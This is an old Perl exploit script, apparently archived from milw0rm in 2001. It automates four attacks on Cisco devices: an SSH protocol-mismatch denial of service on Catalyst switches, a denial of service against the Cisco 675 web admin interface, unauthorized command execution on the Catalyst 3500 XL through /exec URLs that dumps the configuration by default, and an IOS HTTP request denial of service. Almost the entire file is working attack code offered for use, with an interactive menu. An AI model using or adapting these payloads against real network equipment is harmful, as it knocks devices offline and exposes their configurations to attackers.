#!/usr/bin/perl
#
# Written by hypoclear - http://hypoclear.cjb.net
# Thong-th-thong-th-thong.pl AKA thong.pl is a PERL script 
# which automates several attacks against various Cisco products.  
# To be specific:
#
# 12-13-00 - Cisco Catalyst ssh Protocol Mismatch DoS Vulnerability
# 11-28-00 - Cisco 675 Web Administration Denial of Service Vulnerability
# 10-26-00 - Cisco Catalyst 3500 XL Remote Arbitrary Command
# 10-25-00 - Cisco IOS Software HTTP Request DoS Vulnerability 
#
#   usage: ./thong.pl -h <host>

use IO::Socket; use Getopt::Std;
getopts('h:');

if (defined $opt_h)
 {
  $HOST = $opt_h; 
  $PORT; 
  $STRING = ""; 
  $menu_opt = "";

  menu();
  computeOption();
  exploit();
 }

else {print "\n\n usage ./thong.pl -h <host>\n\n"}

sub menu 
{
  print "\n\n     DATE     VULNERABILITY
  1. 12-13-00 - Cisco Catalyst ssh Protocol Mismatch DoS Vulnerability
  2. 11-28-00 - Cisco 675 Web Administration Denial of Service Vulnerability
  3. 10-26-00 - Cisco Catalyst 3500 XL Remote Arbitrary Command
  4. 10-25-00 - Cisco IOS Software HTTP Request DoS Vulnerability  

  Enter Option: ";
  $menu_opt = <STDIN>;
  chomp ($menu_opt);
}

sub computeOption
{
  if    ($menu_opt == "1"){$PORT = 22; $STRING = "this ain't SSH";}
  elsif ($menu_opt == "2"){$PORT = 80; $STRING = "GET ? HTTP/1.0\n\n";}
  elsif ($menu_opt == "3"){$PORT = 80; three();}
  elsif ($menu_opt == "4"){$PORT = 80; $STRING = "GET /error?/ HTTP/1.0\n\n";}
  else  {print "Select a real option!\n"; menu();}
}

sub three
{
  print "Enter file to read or enter D for default (/show/config/cr): ";
  $key = <STDIN>;
  chomp ($key);
  print "\nGetting $key...";

  if (($key eq "D")||($key eq "d"))
  {
    print "\nGetting /show/config/cr...\n"; 
    $STRING = "GET /exec/show/config/cr HTTP/1.0\n\n";
  }
  else 
  {
    print "\nGetting $key...\n";
    $STRING = "GET /exec$key HTTP/1.0\n\n";
  }
}

sub exploit
{
  print "\n\ntrying to exploit $HOST...\n";
 
  $SOCKET = IO::Socket::INET->new(PeerAddr => $HOST,
                                  PeerPort => $PORT,
                                  Proto    => "tcp")
         || die "Couldn't connect to $HOST\n";

  print "\n$STRING\n";
  print $SOCKET "$STRING";
 
  if ($menu_opt == 3){while (<$SOCKET>){print}}
  close($SOCKET);
}


# milw0rm.com [2001-01-27]
